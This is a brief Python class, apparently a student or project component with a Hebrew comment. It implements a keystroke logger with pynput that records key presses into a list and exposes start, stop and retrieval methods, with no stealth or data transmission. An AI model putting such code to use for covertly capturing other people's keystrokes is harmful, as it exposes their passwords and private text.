from pynput import keyboard
from KeyLogger import IKeyLogger
#התוכנה שאוספת את הלחיצות ברשימה\הפעלה\כיבוי\בקשה לקבל את הרשימה
class KeyLoggerService(IKeyLogger):
    def __init__(self):
    
        self.listener = None
        super().__init__()
    def start_logging(self): 
        
        def on_press(key):
            if key == keyboard.Key.enter:
                self.text.append(key)
            elif key == keyboard.Key.tab:
                self.text.append(key)
            elif key == keyboard.Key.space:
                self.text.append(' ') 
            elif key == keyboard.Key.shift:
                pass
            elif key == keyboard.Key.backspace and len(self.text) == 0:
                pass
            elif key == keyboard.Key.backspace and len(self.text) > 0:
                self.text = self.text[:-1]
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                pass
            elif key == keyboard.Key.esc:
                return False
            else:
                self.text.append(key)
                print(self.text)
        self.listener = keyboard.Listener(on_press=on_press) 
        self.listener.start()       
        # with keyboard.Listener(
        #     on_press=on_press) as self.listener:
        #     self.listener.start()       

    def stop_logging(self):
        if self.start_logging:
            self.listener.stop() 
    def get_logged_keys(self):
        return self.text